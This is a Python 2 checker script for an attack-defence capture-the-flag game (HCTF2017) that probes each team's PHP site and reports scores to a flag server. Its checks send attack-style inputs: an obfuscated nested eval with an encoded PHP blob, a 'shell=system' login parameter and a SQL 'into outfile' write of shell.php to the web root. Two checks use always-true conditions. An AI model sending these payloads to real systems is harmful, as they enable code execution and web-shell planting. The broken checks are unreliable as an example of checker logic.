#!/usr/bin/env python
# -*- coding:utf8 -*-
'''

'''
import hashlib
import base64

sleep_time  = 120
debug = True
headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"}

import time
import httplib
import urllib2
import ssl 

my_time = 'AAAA' 
__doc__ = 'http(method,host,port,url,data,headers)'
flag_server = '172.17.0.6'
key = '744def038f39652db118a68ab34895dc'
hosts = open('host.lists','r').readlines()
user_id = [host.split(':')[0] for host in hosts]
hosts = [host.split(':')[1] for host in hosts]
port = 80

def http(method,host,port,url,data,headers):
    con=httplib.HTTPConnection(host,port,timeout=2)
    if method=='post' or method=='POST':
        headers['Content-Length']=len(data)
        headers['Content-Type']='application/x-www-form-urlencoded'  
        con.request("POST",url,data,headers=headers)
    else:
        headers['Content-Length'] = 0    
        con.request("GET",url,headers=headers)
    res = con.getresponse()
    if res.getheader('set-cookie'):
        #headers['Cookie'] = res.getheader('set-cookie')
        pass
    if res.getheader('Location'):
        print "Your 302 direct is: "+res.getheader('Location')
    a = res.read()
    con.close()
    return a


def https(method,host,port,url,data,headers):
    url = 'https://' + host + ":" + str(port) + url
    req = urllib2.Request(url,data,headers)
    response = urllib2.urlopen(req)
    return response.read()

def get_score():
    res = http('get',flag_server,80,'/score.php?key=%s'%key,'',headers)
    print res
    user_scores = res.split('|')
    print "******************************************************************"
    res = ''
    i = 0
    for user_score in user_scores:
	res += (user_id[i] + ":" + user_score).ljust(20,'*')
	i += 1
    print res
    print "******************************************************************" 
    return user_scores

def write_score(scores):
    scores = '|'.join(scores)
    res = http('get',flag_server,80,'/score.php?key=%s&write=1&score=%s'%(key,scores),'',headers)
    if res == "success":
	return True
    else:   
	raise ValueError

class check():
    def __init__(self):
	print "checking host: "+host

    def index_check(self):
	res = http('get',host,port,'/index.php?file=news&cid=1&page=1&test=eval&time=%s'%str(my_time),'',headers)
	if 'HCTF2017' in res:
	    return True
	if debug:
	    print "[fail!] index_check_fail"
	return False
	

    def test_check(self):
	res = http('get',host,port,'/index.php?file=more&time=%s'%str(my_time),'',headers)
	if 'Powered by Yeecent Team' in res:
	    return True
	if debug:
	    print "[fail!] test_check_fail"
	return False


    def admin_check(self):
	headers['Cookie'] = ''
	data = base64.b64encode('eval($b($c($d($b($c($d($b($c($d($b($c($d("BcHJglAwAADQD2Uo0UsOPUtNR8UYVqkb1RhYcKT2r+975tP9ze/G4hhpcgKyhlHNeFY+VLqnCNUBq55lTggTDCQuMEAPeGsrZK35BnUpXBriUPk9VDxp4pL3x7iYj3YH5nIa0/qxXMRMsvmVjX7vkjjs0YYadh5onm96ALwKbaxC1cZgZt5MxBQAi7XfekgpnF0oRBHRVIaznEZaDjbMBJxLXlnLHEIqhMhPofY0PhV3WPsfvYhn7Prhxzc7tw1NLDh7XuS7O3ODKMbAvU1/vAx1kJDp9n59kK7eA84Sw1WUeZfpZTp9AQ==")))))))))))));');
	res = http('post',host,port,'/admin.php?time=%s'%str(my_time),data,headers)
	if 'theme_advanced_buttons1' in res:
	    return True
	if debug:
	    print "[fail!] admin_check_fail"
	return False
	

    def login_check(self):
	headers['Cookie'] = 'PHPSESSID=ujg0tpds1u9d23b969f2duj5c7;'
	tmp = http('get',host,port,'/admin.php?action=logout','',headers)
	data = 'cont1=12345678&bogus=&submit=Log+in'
	res = http('post',host,port,'/login.php?shell=system&time=%s'%str(my_time),data,headers)
	if 'Password correct' or '密码正确' in res:
	    return True
	if debug:
	    print "[fail!] login_fail"
	return False

    def admin_index_check(self):
	headers['Cookie'] = 'PHPSESSID=ujg0tpds1u9d23b969f2duj5c7;'
	data = 'select "aaa" into outfile "/var/www/html/shell.php"'
    	res = http('post',host,port,'/admin.php?action=start',data,headers)
	tmp = http('get',host,port,'/admin.php?action=logout','',headers)
	if 'manage your website' or '管理你的网站' in res:
	    return True
	if debug:
	    print "[fail!] admin_index fail"
	return False
    

def server_check():
    try:
	a = check()
	if not a.index_check():
	    return False
	if not a.test_check():
	    return False
	if not a.admin_check():
	    return False
	if not a.login_check():
	    return False	
	if not a.admin_index_check():
	    return False
	return True
    except Exception,e:
	print e
	return False


game_round = 0
while True:
    
    scores = get_score()
    scores = []
    print "--------------------------- round %d -------------------------------"%game_round
    for host in hosts:
	print "---------------------------------------------------------------"
	host = host[:-1]
	if server_check():
	    print "Host: "+host+" seems ok"
	    scores.append("1")
        else:
	    print "Host: "+host+" seems down"
	    scores.append("-1")
    game_round += 1
    write_score(scores)
    time.sleep(sleep_time)
